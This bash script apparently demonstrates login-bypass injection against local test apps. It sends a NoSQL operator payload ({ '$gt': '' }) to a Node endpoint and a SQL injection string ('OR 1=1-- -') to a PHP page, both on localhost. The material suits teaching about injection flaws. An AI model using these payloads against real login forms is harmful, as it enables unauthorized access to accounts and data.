#!/bin/bash

function send()
{
  echo -e "Sending POST data: \e[34m $1 \e[0m"
  echo -e "\e[33m"
  if [ "$2" == "js" ]; then
    curl -H "Content-Type: application/json" -X POST -d "$1" http://localhost:3000
  else
    curl -L -X POST -d "$1" http://localhost/index.php 2> /dev/null | tr -d "\n"
  fi
  echo -e "\e[0m"
}

function js_exploit()
{
  reqs=( '{ "username": "user", "password": "password" }'
         '{ "username": "foo", "password": "bar" }'
         '{ "username": { "$gt": "" }, "password": { "$gt": "" } }' )

  for req in "${reqs[@]}"; do
    send "$req" "js"
    read k
  done
}

function php_exploit()
{
  reqs=( "name=user&pwd=password"
         "name=foo&pwd=bar"
         "name='OR 1=1-- -'&pwd=" )

  for req in "${reqs[@]}"; do
    send "$req" "php"
    read k
  done
}

while true; do
  read -p "JS / PHP / Quit (J/P/q): " choice

  case $choice in
    [Jj]* ) js_exploit;;
    [Pp]* ) php_exploit;;
    [Qq]* ) exit;;
    *) echo "Invalid choice.";;
  esac

done
